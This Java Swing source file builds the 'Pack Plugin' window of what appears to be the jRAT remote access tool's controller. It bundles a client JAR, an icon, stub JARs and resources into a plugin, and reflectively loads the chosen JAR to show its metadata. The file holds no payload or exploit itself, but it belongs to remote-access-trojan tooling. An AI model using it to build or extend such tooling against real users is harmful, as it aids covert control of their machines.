package io.jrat.controller.ui.frames;

import iconlib.IconUtils;
import io.jrat.common.Logger;
import io.jrat.common.utils.JarUtils;
import io.jrat.controller.ErrorDialog;
import io.jrat.controller.Main;
import io.jrat.controller.build.PluginPacker;
import io.jrat.controller.ui.components.TableModel;
import io.jrat.controller.ui.dialogs.DialogPackPluginEditResources;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.jar.JarFile;
import javax.swing.BorderFactory;
import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.JTextPane;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;
import jrat.api.ui.DefaultJTable;

@SuppressWarnings("serial")
public class FramePackPlugin extends BaseFrame {

	private JPanel contentPane;
	private JLabel lblName;
	private JLabel lblVersion;
	private JLabel lblIcon;
	private JTextField txtClientJAR;
	private JLabel lblAuthor;
	private JTextPane txtDescription;
	private JTextField txtIcon;
	private JButton btnRemove;
	private JTable table;
	private TableModel model;
	private JLabel lblResources;
	private DialogPackPluginEditResources frame = new DialogPackPluginEditResources(this);
	
	public FramePackPlugin() {
		setIconImage(Toolkit.getDefaultToolkit().getImage(FramePackPlugin.class.getResource("/icons/plugin-edit.png")));
		setResizable(false);
		setTitle("Pack Plugin");
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 387, 465);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		
		JPanel panel = new JPanel();
		panel.setBorder(BorderFactory.createTitledBorder("Plugin Preview"));
		
		JLabel lblClientJar = new JLabel("Client JAR");
		
		txtClientJAR = new JTextField();
		txtClientJAR.setColumns(10);
		
		JButton btnBrowseJAR = new JButton("");
		btnBrowseJAR.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				JFileChooser c = new JFileChooser();
				c.showOpenDialog(null);
				File file = c.getSelectedFile();
				
				if (file != null) {
					txtClientJAR.setText(file.getAbsolutePath());
					loadControllerPlugin(file);
				}
			}
		});
		btnBrowseJAR.setIcon(IconUtils.getIcon("folder"));
		
		JLabel lblIcon_1 = new JLabel("Icon (16x16)");
		
		txtIcon = new JTextField();
		txtIcon.setColumns(10);
		
		JButton btnBrowseIcon = new JButton("");
		btnBrowseIcon.addActionListener(new ActionListener() {
			@SuppressWarnings("deprecation")
			public void actionPerformed(ActionEvent arg0) {
				JFileChooser c = new JFileChooser();
				c.showOpenDialog(null);
				File file = c.getSelectedFile();
				
				if (file != null) {
					try {
						ImageIcon icon = new ImageIcon(file.toURL());
						
						txtIcon.setText(file.getAbsolutePath());
						
						lblIcon.setIcon(icon);
					} catch (Exception e) {
						e.printStackTrace();
						JOptionPane.showMessageDialog(null, "Failed loading icon", "Pack Plugin", JOptionPane.ERROR_MESSAGE);
					}
				}
			}
		});
		btnBrowseIcon.setIcon(IconUtils.getIcon("folder"));
		
		btnRemove = new JButton("");
		btnRemove.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				txtIcon.setText("");
				setDefaultIcon();
			}
		});
		btnRemove.setIcon(IconUtils.getIcon("delete"));
		
		JLabel lblStubJars = new JLabel("Stub JARs");
		
		JScrollPane scrollPane_1 = new JScrollPane();
		
		JButton btnAddStub = new JButton("Add Stub");
		btnAddStub.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				JFileChooser c = new JFileChooser();
				c.showOpenDialog(null);
				File file = c.getSelectedFile();
				
				if (file != null) {
					String name = JOptionPane.showInputDialog(null, "Input Stub JAR Name", "Pack Plugin", JOptionPane.QUESTION_MESSAGE);
					
					if (name != null) {
						model.addRow(new Object[] { name + ".jar", file.getAbsolutePath() });
					}
				}
			}
		});
		btnAddStub.setIcon(IconUtils.getIcon("add"));
		
		JButton btnRemove_1 = new JButton("Remove");
		btnRemove_1.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				model.removeRow(table.getSelectedRow());
			}
		});
		btnRemove_1.setIcon(IconUtils.getIcon("delete"));
		
		JButton btnPack = new JButton("Pack");
		btnPack.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				try {
					File input;
					File icon;
					
					Map<String, File> stubJars = new HashMap<String, File>();
					List<File> resources = frame.getResources();
					
					input = new File(txtClientJAR.getText().trim());
					icon = new File(txtIcon.getText().trim());
					
					if (!input.exists()) {
						JOptionPane.showMessageDialog(null, "Invalid client file!", "Pack Plugin", JOptionPane.ERROR_MESSAGE);
						return;
					}
					
					if (!icon.exists()) {
						icon = null;
					}
					
					for (int i = 0; i < table.getRowCount(); i++) {
						String sfile = model.getValueAt(i, 1).toString();
						File file = new File(sfile);
						if (file.exists()) {
							stubJars.put(model.getValueAt(i, 0).toString(), file);
						}
					}
						
					PluginPacker packer = new PluginPacker(input, icon, stubJars, resources);
					packer.pack();
				} catch (Exception ex) {
					ex.printStackTrace();
					ErrorDialog.create(ex);
				}
			}
		});
		btnPack.setIcon(IconUtils.getIcon("plugin-go"));
		
		lblResources = new JLabel("Resources: 0");
		
		JButton btnEditResources = new JButton("Edit Resources");
		btnEditResources.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				frame.setVisible(true);
			}
		});
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(
			gl_contentPane.createParallelGroup(Alignment.TRAILING)
				.addComponent(panel, GroupLayout.DEFAULT_SIZE, GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
				.addGroup(Alignment.LEADING, gl_contentPane.createSequentialGroup()
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addGap(12)
							.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
								.addComponent(lblIcon_1)
								.addComponent(lblClientJar)))
						.addGroup(gl_contentPane.createSequentialGroup()
							.addContainerGap()
							.addComponent(lblStubJars)))
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addGroup(Alignment.TRAILING, gl_contentPane.createSequentialGroup()
							.addComponent(lblResources)
							.addPreferredGap(ComponentPlacement.UNRELATED)
							.addComponent(btnEditResources)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnPack))
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(btnAddStub)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnRemove_1))
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(txtClientJAR, GroupLayout.PREFERRED_SIZE, 185, GroupLayout.PREFERRED_SIZE)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnBrowseJAR))
						.addGroup(gl_contentPane.createSequentialGroup()
							.addComponent(txtIcon, GroupLayout.PREFERRED_SIZE, 185, GroupLayout.PREFERRED_SIZE)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnBrowseIcon, GroupLayout.PREFERRED_SIZE, 49, GroupLayout.PREFERRED_SIZE)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnRemove, GroupLayout.PREFERRED_SIZE, 33, GroupLayout.PREFERRED_SIZE))
						.addComponent(scrollPane_1, 0, 0, Short.MAX_VALUE))
					.addContainerGap())
		);
		gl_contentPane.setVerticalGroup(
			gl_contentPane.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_contentPane.createSequentialGroup()
					.addComponent(panel, GroupLayout.PREFERRED_SIZE, 127, GroupLayout.PREFERRED_SIZE)
					.addGap(11)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
						.addGroup(gl_contentPane.createSequentialGroup()
							.addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING)
								.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
									.addComponent(lblClientJar)
									.addComponent(txtClientJAR, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
								.addComponent(btnBrowseJAR))
							.addPreferredGap(ComponentPlacement.RELATED)
							.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
								.addComponent(lblIcon_1)
								.addComponent(txtIcon, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE)
								.addComponent(btnBrowseIcon, GroupLayout.PREFERRED_SIZE, 25, GroupLayout.PREFERRED_SIZE)))
						.addComponent(btnRemove))
					.addGap(18)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.LEADING)
						.addComponent(lblStubJars)
						.addComponent(scrollPane_1, GroupLayout.PREFERRED_SIZE, 135, GroupLayout.PREFERRED_SIZE))
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnAddStub)
						.addComponent(btnRemove_1))
					.addGap(18)
					.addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnPack)
						.addComponent(btnEditResources)
						.addComponent(lblResources))
					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
		);
		
		table = new DefaultJTable();
		table.setRowHeight(25);
		table.setModel(model = new TableModel(
			new Object[][] {
			},
			new String[] {
				"Name", "File path"
			}
		){
		      public boolean isCellEditable(int row, int column){  
		          return false;  
		      }
		});
		scrollPane_1.setViewportView(table);
		
		lblIcon = new JLabel("");
		setDefaultIcon();
		
		lblName = new JLabel("Unknown name");
		
		lblVersion = new JLabel("Unknown version");
		
		lblAuthor = new JLabel("Unknown author");
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		GroupLayout gl_panel = new GroupLayout(panel);
		gl_panel.setHorizontalGroup(
			gl_panel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel.createSequentialGroup()
					.addContainerGap()
					.addComponent(lblIcon)
					.addPreferredGap(ComponentPlacement.UNRELATED)
					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
						.addComponent(lblAuthor)
						.addComponent(lblVersion)
						.addComponent(lblName))
					.addGap(18)
					.addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 215, Short.MAX_VALUE)
					.addContainerGap())
		);
		gl_panel.setVerticalGroup(
			gl_panel.createParallelGroup(Alignment.LEADING)
				.addGroup(gl_panel.createSequentialGroup()
					.addGroup(gl_panel.createParallelGroup(Alignment.LEADING)
						.addGroup(gl_panel.createSequentialGroup()
							.addContainerGap()
							.addGroup(gl_panel.createParallelGroup(Alignment.TRAILING)
								.addComponent(lblName)
								.addComponent(lblIcon))
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(lblVersion)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(lblAuthor))
						.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 102, GroupLayout.PREFERRED_SIZE))
					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
		);
		
		txtDescription = new JTextPane();
		txtDescription.setEditable(false);
		txtDescription.setText("No description");
		scrollPane.setViewportView(txtDescription);
		panel.setLayout(gl_panel);
		contentPane.setLayout(gl_contentPane);
	}
	
	@SuppressWarnings("deprecation")
	private void loadControllerPlugin(File file) {
		try {
			ClassLoader cl = new URLClassLoader(new URL[] { file.toURL() }, Main.class.getClassLoader());

			String mainClass;

			try {
				mainClass = JarUtils.getMainClassFromInfo(new JarFile(file));
			} catch (Exception ex) {
				ex.printStackTrace();
				Logger.log("Failed loading main class from plugin.txt, trying meta-inf");
				mainClass = JarUtils.getMainClass(new JarFile(file));
			}

			Class<?> classToLoad = Class.forName(mainClass, true, cl);
			Object instance = classToLoad.newInstance();

			setVersion(classToLoad.getMethod("getVersion", new Class[] {}).invoke(instance, new Object[] {}).toString());
			setAuthor(classToLoad.getMethod("getAuthor", new Class[] {}).invoke(instance, new Object[] {}).toString());
			setDescription(classToLoad.getMethod("getDescription", new Class[] {}).invoke(instance, new Object[] {}).toString());
			setName(classToLoad.getMethod("getName", new Class[] {}).invoke(instance, new Object[] {}).toString());
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public void setVersion(String version) {
		lblVersion.setText(version);
	}
	
	public void setAuthor(String author) {
		lblAuthor.setText(author);
	}
	
	public void setDescription(String desc) {
		txtDescription.setText(desc);
	}
	
	public void setName(String name) {
		lblName.setText(name);
	}
	
	private void setDefaultIcon() {
		lblIcon.setIcon(IconUtils.getIcon("plugin"));
	}
	
	public void updateResources(int resources) {
		
	}
}
